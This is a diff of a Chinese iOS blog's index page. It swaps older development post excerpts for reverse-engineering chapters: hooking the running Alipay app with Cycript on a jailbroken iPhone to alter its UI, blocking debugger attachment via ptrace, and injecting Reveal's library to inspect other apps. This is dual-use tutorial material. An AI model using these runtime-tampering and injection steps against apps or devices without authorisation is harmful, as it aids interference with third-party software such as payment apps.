@@ -7,7 +7,7 @@
 	<meta name="author" content="Rick">
 
 	
-	<meta name="description" content="Mac 不仅是一个强大的生产平台，也十分值得你为其开发一些东西。去年我们开始构建我们的第一款 Mac 应用，成功为我们日常工作所在的平台开发点东西是一次十分美好的体验。但是，和为 iOS 系统开发应用相比，在我们了解 Mac 特性的过程中也遇到了一些困难。这篇文章总结了我们从这一过渡中得到的经验 &hellip;">
+	<meta name="description" content="5 使用 Cycript 修改支付宝 App 运行时 Cycript: Objective-JavaScript ，它懂 Objective-C，也懂javascript 。 我们能够借助 Cycript 使用 Objective-C 或者 javascript ，给某个正在运行的进程的 &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,37 +79,93 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/Blog/blog/2014/08/04/cong-uikitdao-appkit/">
+		<a href="/Blog/blog/2016/08/25/zu-zhi-gdb-yi-fu/">
 		
-			从UIKit到APPKit</a>
+			阻止 GDB 依附</a>
 	</h2>
 	<div class="entry-content">
-		<p>Mac 不仅是一个强大的生产平台，也十分值得你<em>为其</em>开发一些东西。去年我们开始构建我们的第一款 <a href="http://decksetapp.com">Mac 应用</a>，成功为我们日常工作所在的平台开发点东西是一次十分美好的体验。但是，和为 iOS 系统开发应用相比，在我们了解 Mac 特性的过程中也遇到了一些困难。这篇文章总结了我们从这一过渡中得到的经验，希望能启发你们去开发自己的第一个 Mac 应用。</p>
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">5</span> <span class="title">使用 Cycript 修改支付宝 App 运行时</span></h1>
+    <p>Cycript: Objective-JavaScript ，它懂 Objective-C，也懂javascript 。</p>
 
-<p>在这篇文章中，我们假定 OS X Yosemite 为我们默认使用的系统。今年，为了融合 iOS 和 OS X，苹果站在开发者的角度对 OS X 做出了巨大的改进。不过，我们会指出哪些特性仅适用于 Yosemite，而哪些特性也适用于之前的系统版本。</p>
+<p>我们能够借助 Cycript 使用 Objective-C 或者 javascript ，给某个正在运行的进程的 runtime 发送消息。</p>
 
-<h2>相似点</h2>
+<p>本文以修改支付宝 app 界面为例，介绍 Cycript 的使用方法。</p>
 
-<p>尽管 iOS 和 OS X 是两个独立的系统，它们却有很多共性。先就开发环境而言，它们使用同样的开发语言，同样的IDE。所以你会对这一切都感到非常熟悉。</p>
+<h4>安装 Cycript</h4>
 
-<p>更重要的是，OS X 和你已经熟悉的 iOS 共用许多框架，像 Foundation，Core Data 和 Core Animation。今年，Apple 进一步整合两个平台，并给 Mac 带来了一些之前仅能在 iOS 上面使用的框架，其中一个例子就是 Multipeer Connectivity。在更底层的地方，你立刻可以看到你熟悉的 API：Core Graphics，Core Text，libdispatch 等等。</p>
+<p>到 Cycript 官方网站下载资源工具，然后推进已越狱的 iPhone 中，进行安装：</p>
 
-<p>真正开始有区别的是 UI 框架 — AppKit 早在 NeXT 时代就已面世并不断进化，而 UIKit 就像是简约版及现代版的 AppKit。出现这种情况的原因，是当 Apple 推出 iPhone 时可以从头开始，并吸取 AppKit 的经验：把已证实过可行的概念和部件拿过来用，并改进不够精良的设计。</p>
+<div class="code code">
+<pre class="code">dpkg -i cycript_0.9.461_iphoneos-arm.deb  
+dpkg -i libffi_1-3.0.10-5_iphoneos-arm.deb</pre>
+</div>
 
-<p>如果你对这个转换是怎么发生的感兴趣，请观看前 Apple iOS 应用总监 <a href="https://twitter.com/nitinganatra">Nitin Ganatra</a> 播客上的精彩剧集：<a href="http://www.imore.com/debug-39-nitin-ganatra-episode-i-system-7-carbon">System 7 to Carbon</a>，<a href="http://www.imore.com/debug-40-nitin-ganatra-episode-ii-os-x-ios">OS X to iOS</a>，以及 <a href="http://www.imore.com/debug-41-nitin-ganatra-episode-iii-iphone-ipad">iPhone to iPad</a>。</p>
+<h4>确定支付宝进程</h4>
 
-<p>考虑到这一点，也就不奇怪为什么 UIKit 和 AppKit 仍旧共享许多概念了。UI 是基于 window 和 view 构建起来的，消息像 iOS 一样通过响应者链传递。此外，<code>UIView</code> 是 <code>NSView</code>，<code>UIControl</code> 是 <code>NSControl</code>，<code>UIImage</code> 是 <code>NSImage</code>，<code>UIViewController</code> 是 <code>NSViewController</code>，<code>UITextView</code> 是 <code>NSTextView</code>&#8230;这样的例子不胜枚举。</p>
+<p>运行支付宝 app，然后获取它的进程号：</p>
 
-<p>看起来就像你仅需把 <code>UI</code> 前缀替换为 <code>NS</code> 前缀，你就可以用同样的方法使用这些类。但事实是在很多情况下这并不奏效。它们在实现上并没有在概念上那么相似。你在 iOS 上的经验至多能帮你大致了解构建用户界面的基础，以及使用很多设计模式，比如代理，都是类似的。但是细节是魔鬼 — 你真的应该通过阅读文档来学习如果使用这些类。</p>
+<div class="code code">
+<pre class="code">Primer:/ root# ps aux | grep Portal  
+&nbsp;
+mobile     479   0.6  4.3   590776  44956   ??  Ss    5:14PM   0:09.58 /var/mobile/Applications/8723004E-9E54-4B37-856D-86292780E958/Portal.app/Portal  
+root       497   0.0  0.0   329252    176 s000  R+    5:21PM   0:00.00 grep Portal</pre>
+</div>
 
-<p>下一节，我们来看看那些常见的陷阱。</p>
+<h4>Cycript 钩住支付宝进程</h4>
 
-<h2>不同点</h2>
+<div class="code code">
+<pre class="code">Primer:/ root# cycript -p 479  
+cy#</pre>
+</div>
 
-<h3 id="windowwindowcontroller">Window 和 Window Controller</h3>
+<h4>获取当前界面的 viewController 并修改背景色</h4>
+
+<div class="code code">
+<pre class="code">cy# var app = [UIApplication sharedApplication]  
+@&quot;&lt;DFApplication: 0x16530660&gt;&quot;  
+&nbsp;
+cy# app.delegate  
+@&quot;&lt;DFClientDelegate: 0x165384d0&gt;&quot;  
+&nbsp;
+cy# var keyWindow = app.keyWindow  
+@&quot;&lt;UIWindow: 0x1654abb0; frame = (0 0; 320 568); gestureRecognizers = &lt;NSArray: 0x1654b190&gt;; layer = &lt;UIWindowLayer: 0x1654ace0&gt;&gt;&quot;  
+&nbsp;
+cy# var rootController = keyWindow.rootViewController  
+@&quot;&lt;DFNavigationController: 0x1654b6c0&gt;&quot;  
+&nbsp;
+cy# var visibleController = rootController.visibleViewController  
+@&quot;&lt;ALPLauncherController: 0x166acfb0&gt;&quot;  
+&nbsp;
+cy# visibleController.childViewControllers  
+@[&quot;&lt;HPHomeWidgetGroup: 0x166afbc0&gt;&quot;,&quot;&lt;ADWRootViewController: 0x165745c0&gt;&quot;,&quot;&lt;ALPAssetsRootViewController: 0x16577250&gt;&quot;,&quot;&lt;SWSecurityWidgetGroup: 0x166bd940&gt;&quot;]  
+&nbsp;
+cy# var assetsController = new Instance(0x16577250)  
+@&quot;&lt;ALPAssetsRootViewController: 0x16577250&gt;&quot;  
+&nbsp;
+cy# assetsController.view.backgroundColor = [UIColor blueColor]  
+@&quot;UIDeviceRGBColorSpace 0 0 1 1&quot;</pre>
+</div>
+
+<div class="figure" id="figure-5-1">
+    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f75u2jk7lsj208w0fsjs3.jpg" />
+
+    <p class="caption"><strong>图片 5.1</strong> cycrypt</p>
+</div>
+
+
+<p>当然，只是修改个背景色好没意思……</p>
+
+<p>想修改更多信息，还得介绍一下另一个利器： class-dump 。下篇再总结～</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
 
 		
-		<a href="/Blog/blog/2014/08/04/cong-uikitdao-appkit/" class="more-link">Read on &rarr;</a>
+		
 	</div>
 
 
@@ -128,7 +184,7 @@
 
 </div>
 	
-	<div class="comments"><a href="/Blog/blog/2014/08/04/cong-uikitdao-appkit/#disqus_thread">Comments</a></div>
+	<div class="comments"><a href="/Blog/blog/2016/08/25/zu-zhi-gdb-yi-fu/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
@@ -137,77 +193,44 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/Blog/blog/2014/07/04/bi-bao-%2Cni-liao-jie-duo-shao-%3F/">
+		<a href="/Blog/blog/2016/08/25/rezu-zhi-gdb-yi-fu/">
 		
-			闭包，你了解多少？</a>
+			阻止 GDB 依附</a>
 	</h2>
 	<div class="entry-content">
-		<p>在计算机科学中，闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。所以，有另一种说法认为闭包是由函数和与其相关的引用环境组合而成的实体。闭包在运行时可以有多个实例，不同的引用环境和相同的函数组合可以产生不同的实例。
-闭包的概念出现于60年代，最早实现闭包的程序语言是Scheme。之后，闭包被广泛使用于函数式编程语言如ML语言和LISP。很多命令式程序语言也开始支持闭包。
-在一些语言中，在函数中可以（嵌套）定义另一个函数时，如果内部的函数引用了外部的函数的变量，则可能产生闭包。运行时，一旦外部的 函数被执行，一个闭包就形成了，闭包中包含了内部函数的代码，以及所需外部函数中的变量的引用。其中所引用的变量称作上值(upvalue)。
-闭包一词经常和匿名函数混淆。这可能是因为两者经常同时使用，但是它们是不同的概念。</p>
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">4</span> <span class="title">阻止 GDB 依附</span></h1>
+    <p>GDB 是大多数 hackers 的首选，阻止 GDB 依附到应用的常规办法是：</p>
 
-<p>闭包和状态表达闭包可以用来在一个函数与一组“私有”变量之间创建关联关系。在给定函数被多次调用的过程中，这些私有变量能够保持其持久性。变量的作用域仅限于包含它们的函数，因此无法从其它程序代码部分进行访问。不过，变量的生存期是可以很长，在一次函数调用期间所创建所生成的值在下次函数调用时仍然存在。正因为这一特点，闭包可以用来完成信息隐藏，并进而应用于需要状态表达的某些编程范型中。
-不过，用这种方式来使用闭包时，闭包不再具有引用透明性，因此也不再是纯函数。即便如此，在某些“近似于函数式编程语言”的语言，例如Scheme中，闭包还是得到了广泛的使用。</p>
-
-<p>闭包和第一类函数</p>
-
-<p>典型的支持闭包的语言中，通常将函数当作第一类对象——在这些语言中，函数可以被当作参数传递、也可以作为函数返回值、绑定到变量名、就像字符串、整数等简单类型。例如以下Scheme代码：</p>
 <div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
 <span class="line-number">3</span>
 <span class="line-number">4</span>
 <span class="line-number">5</span>
-</pre></td><td class="code"><pre><code class="scheme"><span class="line"><span class="c1">; Return a list  of all books with at least THRESHOLD copies sold.</span>
-</span><span class="line"><span class="p">(</span><span class="k">define </span> <span class="p">(</span><span class="nf">best-selling-books</span>  <span class="nv">threshold</span><span class="p">)</span>
-</span><span class="line">   <span class="p">(</span><span class="nf">filter</span>
-</span><span class="line">    <span class="p">(</span><span class="k">lambda </span><span class="p">(</span><span class="nf">book</span><span class="p">)</span> <span class="p">(</span><span class="nb">&gt;= </span><span class="p">(</span><span class="nf">book-sales</span> <span class="nv">book</span><span class="p">)</span>  <span class="nv">threshold</span><span class="p">))</span>
-</span><span class="line">    <span class="nv">book-list</span><span class="p">))</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;sys/ptrace.h&gt;  </span>
+</span><span class="line">
+</span><span class="line"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">charchar</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line"> <span class="err">#</span><span class="n">ifndef</span> <span class="n">DEBUG</span>
+</span><span class="line">    <span class="n">ptrace</span><span class="p">(</span><span class="n">PT_DENY_ATTACH</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span><span class="line"> <span class="err">#</span><span class="n">endif</span>
+</span><span class="line">    <span class="err">@</span><span class="n">autoreleasepool</span> <span class="p">{</span>
+</span><span class="line">        <span class="k">return</span> <span class="n">UIApplicationMain</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">nil</span><span class="p">,</span> <span class="n">NSStringFromClass</span><span class="p">([</span><span class="n">WQMainPageAppDelegate</span> <span class="n">class</span><span class="p">]));</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line"><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
-<p>在这个例子中，lambda表达式(lambda (book) (&gt;= (book-sales book) threshold))出现在函数best-selling-books中。当这个lambda表达式被执行时，Scheme创造了一个包含此表达式以及对threshold变量的引用的闭包，其中threshold变量在lambda表达式中是自由变量。
-这个闭包接着被传递到filter函数。这个函数的功能是重复调用这个闭包以判断哪些书需要增加到列表那些需要丢弃。因为闭包中引用了变量threshold，所以它在每次被filter调用时都可以使用这个变量，虽然filter可能定义在另一个文件中。
 
-		
-		<a href="/Blog/blog/2014/07/04/bi-bao-%2Cni-liao-jie-duo-shao-%3F/" class="more-link">Read on &rarr;</a>
-	</div>
+<p>但遗憾的是，iPhone 真实的运行环境是没有 sys/ptrace.h 抛出的。虽然 ptrace 方法没有被抛出, 但是不用担心，我们可以通过 dlopen 拿到它。</p>
 
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2014/07/04/bi-bao-%2Cni-liao-jie-duo-shao-%3F/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2014/07/02/ios-8-ti-yan-tui-song/">
-		
-			iOS 8 体验推送</a>
-	</h2>
-	<div class="entry-content">
-		<p> 一直更新了iOS8，但是一直没有开始研究这个iOS8，今天因为项目用到了推送，于是体验了iOS8的推送，先讲讲这个推送。目前分为四个推送：用户推送，本地推送，远程推送，地理位置推送。
-</p>
-<p><img src="http://ww3.sinaimg.cn/large/626e5d69gw1ehyeq298goj21kw0sadmt.jpg" alt="推送界面" /></p>
-
-<h2>用户推送</h2>
-<p>我们先开始讲这个用户推送,我们要使用之前必须先注册这个推送，用户要允许这个程序进行推送</p>
-<p>注册过程：</p>
+<p>dlopen： 当 path 参数为 0 是,他会自动查找<br />
+<code>$LD_LIBRARY_PATH, $DYLD_LIBRARY_PATH,  $DYLD_FALLBACK_LIBRARY_PATH</code> 和当前工作目录中的动态链接库。</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -230,39 +253,42 @@
 <span class="line-number">19</span>
 <span class="line-number">20</span>
 <span class="line-number">21</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">BOOL</span><span class="p">)</span><span class="nf">application:</span><span class="p">(</span><span class="n">UIApplication</span> <span class="o">*</span><span class="p">)</span><span class="nv">application</span> <span class="nf">didFinishLaunchingWithOptions:</span><span class="p">(</span><span class="n">NSDictionary</span> <span class="o">*</span><span class="p">)</span><span class="nv">launchOptions</span> <span class="p">{</span>
-</span><span class="line">    <span class="c1">// Override point for customization after application launch.</span>
-</span><span class="line">    <span class="n">UIUserNotificationType</span>  <span class="n">types</span> <span class="o">=</span> <span class="n">UIUserNotificationTypeBadge</span> <span class="o">|</span> <span class="n">UIUserNotificationTypeSound</span> <span class="o">|</span> <span class="n">UIUserNotificationTypeAlert</span> <span class="p">;</span>
-</span><span class="line">    <span class="n">UIUserNotificationSettings</span>  <span class="o">*</span><span class="n">mySettings</span>  <span class="o">=</span> <span class="p">[</span><span class="n">UIUserNotificationSettings</span> <span class="nl">settingsForTypes:</span><span class="n">types</span> <span class="nl">categories:</span><span class="nb">nil</span><span class="p">];</span>
-</span><span class="line">    <span class="p">[[</span><span class="n">UIApplication</span> <span class="n">sharedApplication</span><span class="p">]</span> <span class="nl">registerUserNotificationSettings:</span><span class="n">mySettings</span><span class="p">];</span>
-</span><span class="line">    <span class="k">return</span> <span class="n">YES</span><span class="p">;</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;dlfcn.h&gt;  </span>
+</span><span class="line"> <span class="err">#</span><span class="n">import</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="k">typedef</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrace_ptr_t</span><span class="p">)(</span><span class="kt">int</span> <span class="n">_request</span><span class="p">,</span> <span class="n">pid_t</span> <span class="n">_pid</span><span class="p">,</span> <span class="n">caddr_t</span> <span class="n">_addr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">_data</span><span class="p">);</span>
+</span><span class="line"> <span class="err">#</span><span class="k">if</span> <span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="n">PT_DENY_ATTACH</span><span class="p">)</span>
+</span><span class="line"> <span class="err">#</span><span class="n">define</span> <span class="n">PT_DENY_ATTACH</span> <span class="mi">31</span>
+</span><span class="line"> <span class="err">#</span><span class="n">endif</span>  <span class="c1">// !defined(PT_DENY_ATTACH)  </span>
+</span><span class="line">
+</span><span class="line"><span class="kt">void</span> <span class="n">disable_gdb</span><span class="p">()</span> <span class="p">{</span>
+</span><span class="line">    <span class="kt">void</span><span class="o">*</span> <span class="n">handle</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">RTLD_GLOBAL</span> <span class="o">|</span> <span class="n">RTLD_NOW</span><span class="p">);</span>
+</span><span class="line">    <span class="n">ptrace_ptr_t</span> <span class="n">ptrace_ptr</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">&quot;ptrace&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">ptrace_ptr</span><span class="p">(</span><span class="n">PT_DENY_ATTACH</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class="line">    <span class="n">dlclose</span><span class="p">(</span><span class="n">handle</span><span class="p">);</span>
 </span><span class="line"><span class="p">}</span>
 </span><span class="line">
-</span><span class="line">
-</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">application:</span><span class="p">(</span><span class="n">UIApplication</span> <span class="o">*</span><span class="p">)</span><span class="nv">application</span> <span class="nf">didRegisterUserNotificationSettings:</span><span class="p">(</span><span class="n">UIUserNotificationSettings</span> <span class="o">*</span><span class="p">)</span><span class="nv">notificationSettings</span>
+</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">charchar</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
 </span><span class="line"><span class="p">{</span>
-</span><span class="line">    <span class="n">UIUserNotificationType</span> <span class="n">allowTypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">notificationSettings</span> <span class="n">types</span><span class="p">];</span>
-</span><span class="line"><span class="p">}</span>
-</span><span class="line">
-</span><span class="line">
-</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">getReadyForNotification</span>
-</span><span class="line"><span class="p">{</span>
-</span><span class="line">    <span class="n">UIUserNotificationSettings</span> <span class="o">*</span><span class="n">currentNotificationSettings</span> <span class="o">=</span> <span class="p">[[</span><span class="n">UIApplication</span> <span class="n">sharedApplication</span><span class="p">]</span> <span class="n">currentUserNotificationSettings</span><span class="p">];</span>
-</span><span class="line">    <span class="p">[</span><span class="n">self</span> <span class="nl">checkSetting:</span><span class="n">currentNotificationSettings</span><span class="p">];</span>
-</span><span class="line">
+</span><span class="line"> <span class="err">#</span><span class="n">ifndef</span> <span class="n">DEBUG</span>
+</span><span class="line">    <span class="n">disable_gdb</span><span class="p">();</span>
+</span><span class="line"> <span class="err">#</span><span class="n">endif</span>
+</span><span class="line">    <span class="err">@</span><span class="n">autoreleasepool</span> <span class="p">{</span>
+</span><span class="line">        <span class="k">return</span> <span class="n">UIApplicationMain</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">nil</span><span class="p">,</span> <span class="n">NSStringFromClass</span><span class="p">([</span><span class="n">WQMainPageAppDelegate</span> <span class="n">class</span><span class="p">]));</span>
+</span><span class="line">    <span class="p">}</span>
 </span><span class="line"><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>总结就是三个方法进行注册</p>
-<p><img src="http://ww4.sinaimg.cn/large/626e5d69gw1ehyeumz8inj21f80d40up.jpg" alt="推送注册三个方法" /></p>
-
-<p>我们现在仅仅是注册了通知的设置，还要注册推送通知的行为，在iOS8中，行为能直接在推送消息进行，如回复消息，拒绝消息等</p>
-<p><img src="http://ww1.sinaimg.cn/large/626e5d69gw1ehyeyi825mj21aa12ggoc.jpg" alt="直接在推送消息进行回复" /></p>
-<p>这个真心碉堡了</p>
-<p>我们如何能进行这些行为，首先我们需注册这些行为。</p>
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
 
 		
-		<a href="/Blog/blog/2014/07/02/ios-8-ti-yan-tui-song/" class="more-link">Read on &rarr;</a>
+		
 	</div>
 
 
@@ -281,7 +307,7 @@
 
 </div>
 	
-	<div class="comments"><a href="/Blog/blog/2014/07/02/ios-8-ti-yan-tui-song/#disqus_thread">Comments</a></div>
+	<div class="comments"><a href="/Blog/blog/2016/08/25/rezu-zhi-gdb-yi-fu/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
@@ -290,294 +316,70 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/Blog/blog/2014/06/20/shi-yong-vipergou-jian-iosying-yong/">
+		<a href="/Blog/blog/2016/08/25/revealcha-kan-app-ui/">
 		
-			使用VIPER构建iOS应用</a>
+			Reveal查看APP UI</a>
 	</h2>
 	<div class="entry-content">
-		<script type="text/javascript">
-    var wumiiPermaLink = ""; //请用代码生成文章永久的链接
-    var wumiiTitle = ""; //请用代码生成文章标题
-    var wumiiTags = ""; //请用代码生成文章标签，以英文逗号分隔，如："标签1,标签2"
-    var wumiiCategories = []; //请用代码生成文章分类，分类名放在 JSONArray 中，如: ["分类1", "分类2"]
-    var wumiiSitePrefix = "http://itmonkeylife.github.io/Blog/";
-    var wumiiParams = "&num=5&mode=3&pf=JAVASCRIPT";
-</script>
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">3</span> <span class="title">使用 Reveal 分析他人 App</span></h1>
+    <h3>准备工作</h3>
 
-<script type="text/javascript" src="http://widget.wumii.cn/ext/relatedItemsWidget"></script>
+<p>1）已越狱的设备，并且已安装了 OpenSSH , MobileSubstrate 等实用工具( Cydia 源里安装)</p>
 
-<p><a href="http://www.wumii.com/widget/relatedItems" style="border:0;">
-    <img src="http://static.wumii.cn/images/pixel.png" alt="无觅关联推荐，快速提升流量" style="border:0;padding:0;margin:0;" />
-</a></p>
+<p>2）本地已安装了 Reveal</p>
 
-<p>建筑领域流行这样一句话，“我们虽然在营造建筑，但建筑也会重新塑造我们”。正如所有开发者最终领悟到的，这句话同样适用于构建软件。</p>
+<h3>操作步骤</h3>
 
-<p>编写代码中至关重要的是，需要使每一部分容易被识别，赋有一个特定而明显的目的，并与其他部分在逻辑关系中完美契合。这就是我们所说的软件架构。好的架构不仅让一个产品成功投入使用，还可以让产品具有可维护性，并让人不断头脑清醒的对它进行维护！</p>
+<h4>拷贝 framework 和 dylib 到越狱机</h4>
 
-		
-		<a href="/Blog/blog/2014/06/20/shi-yong-vipergou-jian-iosying-yong/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
+<div class="code code">
+<pre class="code">&nbsp;
+scp -r /Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/Reveal.framework root@192.168.0.X:/System/Library/Frameworks
+scp /Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dylib root@192.168.0.X:/Library/MobileSubstrate/DynamicLibraries</pre>
 </div>
-	<div class="tags">
 
+<h4>编辑 libReveal.plist</h4>
 
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2014/06/20/shi-yong-vipergou-jian-iosying-yong/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2014/06/18/ocde-zi-lei/">
-		
-			OC的子类</a>
-	</h2>
-	<div class="entry-content">
-		<p>这篇文章跟我以往的文章有点不一样。它主要是一些思想与模式的汇集，而不是一篇指南。下面我所写的模式几乎全都来之不易，都是我犯了错之后才学到的。我并不认为自己是子类方面的权威，但我确实想把我学到的一些东西分享出来。别把本文当做权威指南，它只是一些例子的汇集。</p>
-
-<p>在被问到 OOP（面向对象编程）的时候，Alan Kay（OOP 的发明人）写到：它跟类无关，但跟消息有关。<a href="http://c2.com/cgi/wiki?AlanKayOnMessaging">^1</a>然而，很多人的关注点仍然还在类层次上。在本文中，我们会看几个我们可能会把注意力放在创建复杂的类结构上的例子，并给出更有用的替代方案。根据经验，这样会让代码更简单，更易维护。关于这个话题，在 <a href="http://www.amazon.com/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882">Clean Code</a>（中文版：<a href="http://www.amazon.cn/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93-%E9%A9%AC%E4%B8%81/dp/B0031M9GHC/ref=pd_bxgy_b_img_y">代码整洁之道</a>）和 <a href="http://www.amazon.com/Code-Complete-Practical-Handbook-Construction/dp/0735619670">Code Complete</a>（中文版：<a href="http://www.amazon.cn/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8-%E5%8F%B2%E8%92%82%E5%A4%AB%E2%80%A2%E8%BF%88%E5%85%8B%E5%BA%B7%E5%A5%88%E5%B0%94/dp/B0061XKRXA/ref=pd_bxgy_b_img_z">代码大全</a>）中已经有大量讨论。推荐你阅读这两本书。</p>
-
-<h2>何时用子类</h2>
-
-<p>首先，我们讨论几种使用子类比较合适的场景。如果你要写一个自定义布局的 <code>UITableViewCell</code> ，那就创建一个子类。这同样适用于几乎每个视图。一旦你开始布局，把这块代码放入子类就更合理一些，不光代码得到了更好的封装，你也能得到一个可在工程之间重用的组件。</p>
-
-		
-		<a href="/Blog/blog/2014/06/18/ocde-zi-lei/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2014/06/18/ocde-zi-lei/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2014/06/17/mvvmjie-shao/">
-		
-			MVVM介绍</a>
-	</h2>
-	<div class="entry-content">
-		<p>有时我感觉就像我不知道在做什么。虽然我知道自己的设计模式——就像任何好的编程人员那样 —— 但我太接近我在做的产品以至于不能客观地衡量我的架构决策的有效性。当队伍中来了另外一位开发者时，我意识到我们陷入困境了。</p>
-
-<p>从没听过 MVC ？有人称之为 Massive View Controller（重量级视图控制器），这就是我们那时候的感觉。我不打算介绍令人汗颜的细节，但说实在的，如果我不得不再次重来一次，我绝对会做出不同的决策。</p>
-
-<p>我会修改一个关键架构，并将其带入我从那时起就在开发的各种应用，即使用一种叫做 Model-View-ViewModel 的架构替换 Model-View-Controller。</p>
-
-<p>所以，MVVM 到底是什么？与其专注于说明 MVVM 的来历，不如让我们看一个典型的 iOS 是如何构建的，并从那里了解 MVVM：</p>
-
-<p><img src="http://img.objccn.io/issue-13/mvvm1.png" alt="Typical Model-View-Controller setup" /></p>
-
-<p>我们看到的是一个典型的 MVC 设置。Model 呈现数据，View 呈现用户界面，而 View Controller 调节它两者之间的交互。Cool！</p>
-
-<p>稍微考虑一下，虽然 View 和 View Controller 是技术上不同的组件，但它们几乎总是手牵手在一起，成对的。你什么时候看到一个 View 能够与不同 View Controller 配对？或者反过来？所以，为什么不正规化它们的连接呢？</p>
-
-		
-		<a href="/Blog/blog/2014/06/17/mvvmjie-shao/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2014/06/17/mvvmjie-shao/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2014/05/23/jiao-hu-shi-dong-hua/">
-		
-			交互式动画</a>
-	</h2>
